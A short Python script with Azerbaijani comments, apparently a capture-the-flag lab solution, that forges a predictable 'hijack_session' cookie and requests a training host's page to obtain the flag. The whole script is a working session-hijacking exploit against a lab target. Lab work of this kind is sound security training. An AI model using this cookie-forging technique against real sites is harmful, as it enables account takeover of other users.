import requests

url = "http://web0x01.hbtn/a1/hijack_session"
# Sizin cookie hissələriniz (dəyişməyə ehtiyac yoxdur, skript artıq 0-ı tapıb)
uuid_part = "3f877254-08c4-4e14-8bc" 
timestamp_part = "17686664075" 

# Sadəcə 0-ı yoxlayaq, çünki artıq bilirik odur
cookie_value = f"{uuid_part}-0-{timestamp_part}"
cookies = {'hijack_session': cookie_value}

print(f"Yoxlanılır: {cookie_value}")
response = requests.get(url, cookies=cookies)

if "Sign in" not in response.text:
    print("\n[+] UĞURLU! Budur serverin cavabı:\n")
    print(response.text)  # <--- FLAG BURADA OLACAQ
else:
    print("[-] Hələ də 'Sign in' səhifəsidir...")
